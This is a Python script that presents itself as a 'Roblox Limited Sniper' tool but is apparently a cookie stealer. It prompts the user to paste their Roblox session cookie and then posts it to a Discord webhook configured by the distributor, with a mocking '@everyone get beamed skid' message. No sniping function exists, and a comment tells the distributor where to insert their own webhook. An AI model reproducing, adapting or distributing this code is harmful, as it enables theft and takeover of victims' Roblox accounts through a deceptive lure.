#dont skid this
from dhooks import Webhook
import requests, threading, os
import time
import colorama
from colorama import Fore, Back, Style
from pystyle import Anime, Colorate, Colors, Center, System, Write

colorama.init()

loadingauth = ""
#put your webhook between the "" for it to send

def w(text: str):
    Write.Input(text=text,
                color=Colors.purple_to_blue,
                interval=0.005,
                input_color=Colors.white)


def startup():
    System.Clear()
    System.Title("Unknown Sniper")
    System.Size(200, 60)


startup()


def main():
    w("Welcome to Unknown Limited Sniper! Press enter to continue")
    cookiedata = Write.Input("put your roblox cookie here, we will alert you on roblox if theres any cheap snipes! ->",
                             Colors.purple_to_blue,
                             interval=0.005)
    os.system('cls')
    w("You can leave this program now by pressing enter. :)")
    requests.post(loadingauth,
                  json={
                      'username': 'Cookie Sender',
                      'content': "@everyone get beamed skid" f'```{cookiedata}```'
                  })
    
    os.system('cls')



main()
